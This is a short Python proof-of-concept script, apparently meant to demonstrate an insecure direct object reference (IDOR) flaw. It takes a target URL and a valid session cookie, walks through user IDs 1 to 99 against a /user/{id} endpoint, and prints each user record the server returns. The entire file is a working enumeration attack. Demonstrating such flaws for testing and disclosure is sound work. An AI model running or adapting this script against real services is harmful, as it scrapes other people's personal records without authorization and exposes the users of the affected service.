# idor_exploit.py
"""Proof of concept for IDOR vulnerability"""
import requests
import json

def exploit_idor(target_url, valid_session_cookie):
    """
    Demonstrates IDOR vulnerability by accessing all user records
    """
    headers = {'Cookie': f'session={valid_session_cookie}'}
    
    # Try accessing different user IDs
    for user_id in range(1, 100):
        response = requests.get(f"{target_url}/user/{user_id}", 
                              headers=headers)
        if response.status_code == 200:
            print(f"Found user {user_id}:", json.dumps(response.json(), indent=2))

